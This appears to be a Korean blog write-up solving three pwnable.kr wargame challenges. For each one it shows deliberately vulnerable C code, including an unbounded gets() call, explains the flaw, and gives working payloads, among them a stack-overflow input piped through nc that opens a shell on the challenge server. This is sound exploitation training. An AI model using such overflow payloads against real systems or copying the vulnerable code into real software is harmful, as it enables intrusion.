---
title: "[pwnable] fd, collision, bof"
date: 2024-11-30 22:56:00 +0900
categories: [pwnable]
tags: [pwnable]
description: pwnable, system hack
---

# [pwnable] fd

```shell
$ cat fd.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

커맨드라인 argument로 들어온 숫자에서 0x1234를 빼서 fd로 지정한다. \
기본적으로 프로세스에는 0(stdin), 1(stdout), 2(stderr)번 fd가 할당되기 때문에
[4660 or 4661 or 4662]를 입력하고, LETMEWIN을 입력하면 flag를 얻을 수 있다.

### 정답

```shell
./fd 4660
LETMEWIN
```

<br/>

# [pwnable] collision

```shell
$ cat col.c
```

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

hashcode가 4바이트이고, 총 20바이트의 문자열을 입력받아서 이를 4바이트씩 쪼갠 다음 모두 더해서 hashcode와 같게끔 만드는 문제이다.
<br/>

입력 문자열을 잘 조합하여 입력하면 된다는 것을 알았지만, \
(예: 6c5cec8 \* 4 + 6c5cecc)\
6c5cec8 혹은 6c5cecc를 커맨드라인으로 입력하는 방법을 생각하지 못하였다.

구글링 결과 파이썬 -c 옵션을 통해 해결할 수 있었다.

그리고 little endian 방식으로 작성해줘야한다.
hashcode 가장 앞쪽의 21을 만들기 위해

```
\!\0\0\0
```

을 출력해보니 30303021이 나왔다.

### 정답

```shell
$ ./col `python -c 'print ("\xc8\xce\xc5\x06"*4+"\xcc\xce\xc5\x06")'`
```

<br/>

# [pwnable] bof

bof는 buffer overflow를 뜻한다.

우선 bof 바이너리를 실행해보니, i386 아키텍쳐 타겟의 바이너리인 것으로 보였다.

```shell
$ ./bof
qemu-i386: Could not open '/lib/ld-linux.so.2': No such file or directory
```

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

gdb로 디스어셈블링을 해 보았다.

```shell
$ gdb ./bof
```

타겟 아키텍처 및 어셈블리어 형식을 지정하는 법은 다음과 같았다.

```shell
$ gdb ./bof
set architecture i386
set disassembly-flavor intel
```

```python
disas func

   0x0000062c <+0>:		push   ebp
   0x0000062d <+1>:		mov    ebp,esp
   0x0000062f <+3>:		sub    esp,0x48
   0x00000632 <+6>:		mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave
   0x00000689 <+93>:	ret
```

첫번째 call은 printf를 call하는 것이고, 두번째 call을 보면,

```python
0x00000649 <+29>:	lea    eax,[ebp-0x2c]
0x0000064c <+32>:	mov    DWORD PTR [esp],eax
0x0000064f <+35>:	call   0x650 <func+36>
```

[ebp-0x2c]의 주소를 esp(다음 호출될 함수의 첫번째 인자)로 넘긴 다음, 함수(gets)를 호출한다.
따라서 [ebp-0x2c]에 overflowme가 위치한 것을 확인할 수 있다. \
<br/>

```python
0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
```

위 행에서 key가 [ebp+0x8] 의 주소에 저장된 것을 알 수 있다.

[ebp-0x2c]와 [ebp+0x8]의 차이는 0x34, 52이므로 gets에서 52byte 만큼의 더미 데이터로 스택을 덮어씌우고 그 다음 0xcafebabe를 넣어주면 sh을 실행할 수 있다.

### 정답
```
(python -c 'print "A"*52 + "\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
```
혹은
```
(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 52 + b"\xbe\xba\xfe\xca")';cat) | nc pwnable.kr 9000
```

